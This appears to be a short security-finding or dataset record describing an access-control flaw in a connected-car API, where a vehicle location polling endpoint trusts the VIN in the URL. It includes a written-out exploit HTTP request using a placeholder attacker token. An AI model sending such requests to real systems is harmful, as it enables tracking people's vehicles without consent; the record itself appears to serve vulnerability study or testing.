diagnosis: The endpoint long-polls vehicle GPS tracking telemetry using vin from the URL without verifying that the vehicle is registered to req.user.id. An attacker can track the real-time geographic movements of any vehicle on the platform.
exploit_request:
GET /api/vehicles/1HGCR2F83HA099812/location/poll?since=1710000000 HTTP/1.1
Host: telematics.connectedcar.net
Authorization: Bearer <attacker_jwt>
